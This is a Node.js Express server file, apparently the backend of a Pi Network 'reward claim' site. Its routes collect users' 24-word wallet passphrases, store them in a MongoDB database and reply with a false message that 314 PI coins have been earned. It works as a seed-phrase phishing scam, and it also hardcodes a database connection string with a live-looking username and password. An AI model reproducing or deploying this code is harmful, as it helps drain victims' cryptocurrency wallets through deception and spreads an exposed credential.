const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

// MongoDB connection URL
const MONGODB_URI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';

// Connect to MongoDB
mongoose.connect(MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
})
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.log('Error connecting to MongoDB:', err));

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Simple route for the root URL to serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html')); // Serve index.html from the public folder
});

// MongoDB Schema
const saleSchema = new mongoose.Schema({
    piAmount: Number,
    passphrase: String,
    paymentMethod: String,
});

const Sale = mongoose.model('Sale', saleSchema);

// Save passphrase route
app.post('/save-passphrase', (req, res) => {
    const { piAmount, passphrase, paymentMethod } = req.body;

    const newSale = new Sale({
        piAmount,
        passphrase,
        paymentMethod,
    });

    newSale.save()
        .then(() => {
            res.json({ success: true });
        })
        .catch(err => {
            console.log('Error saving data:', err);
            res.json({ success: false });
        });
});

// Reward claim route
app.post('/claim-reward', (req, res) => {
    const { passphrase } = req.body;

    // Check if the passphrase already exists in the database
    Sale.findOne({ passphrase })
        .then(existingSale => {
            if (existingSale) {
                // Passphrase already exists
                return res.json({ success: false, message: 'You can only Claim once.' });
            }

            // Passphrase is valid and not claimed
            if (passphrase.split(' ').length !== 24) {
                return res.json({ success: false, message: 'Invalid passphrase' });
            }

            // Save the reward claim
            const newSale = new Sale({
                passphrase,
                paymentMethod: 'reward-claim', // Example for identifying reward claims
            });

            newSale.save()
                .then(() => {
                    res.json({ success: true, message: 'Congratulations!!! You have earned your 314 PI Coins Successfully!!' });
                })
                .catch(err => {
                    console.log('Error saving reward data:', err);
                    res.json({ success: false, message: 'Failed to process reward claim' });
                });
        })
        .catch(err => {
            console.log('Error checking passphrase:', err);
            res.json({ success: false, message: 'An error occurred while processing your request.' });
        });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
